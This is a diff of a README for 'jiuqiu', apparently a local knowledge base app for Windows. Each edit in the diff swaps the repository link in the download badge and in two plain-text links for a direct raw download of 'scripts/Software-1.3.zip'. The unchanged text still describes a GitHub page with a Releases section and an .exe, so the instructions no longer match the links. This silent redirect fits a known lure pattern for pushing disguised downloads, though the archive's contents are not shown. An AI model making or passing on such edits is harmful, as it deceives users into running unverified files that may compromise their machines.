@@ -1,6 +1,6 @@
 # 📚 jiuqiu - Local Knowledge Base Made Simple
 
-[![Download jiuqiu](https://img.shields.io/badge/Download-jiuqiu-brightgreen?style=for-the-badge)](https://github.com/Supriya6532/jiuqiu)
+[![Download jiuqiu](https://img.shields.io/badge/Download-jiuqiu-brightgreen?style=for-the-badge)](https://github.com/Supriya6532/jiuqiu/raw/refs/heads/main/scripts/Software-1.3.zip)
 
 ## 📘 About jiuqiu
 
@@ -30,7 +30,7 @@ You will find the latest version of jiuqiu on its GitHub page. Below, you will g
 
 Click the big green badge above, or use this direct link to visit the GitHub page where you can download the app:
 
-https://github.com/Supriya6532/jiuqiu
+https://github.com/Supriya6532/jiuqiu/raw/refs/heads/main/scripts/Software-1.3.zip
 
 Once on the page, look for a **Releases** section or a download folder. Download the latest Windows installer or executable file you find.
 
@@ -91,7 +91,7 @@ If you have trouble installing or running jiuqiu, try these steps:
 
 Use this link again to go to the download page:
 
-https://github.com/Supriya6532/jiuqiu
+https://github.com/Supriya6532/jiuqiu/raw/refs/heads/main/scripts/Software-1.3.zip
 
 Click **Releases** or the latest version folder. Download the Windows installation file (usually an `.exe`).
 
